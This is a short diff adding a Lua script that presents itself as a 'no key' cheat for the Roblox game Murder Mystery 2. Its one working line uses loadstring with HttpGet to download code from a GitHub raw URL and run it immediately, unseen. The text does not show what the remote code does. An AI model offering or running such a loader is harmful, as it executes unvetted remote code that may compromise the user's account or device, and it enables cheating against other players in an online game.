@@ -1,0 +1,7 @@
+-- OP Murder Mystery 2 Halloween Update Script for Mobile & PC
+-- no key
+-- Credit to the owner
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+
+
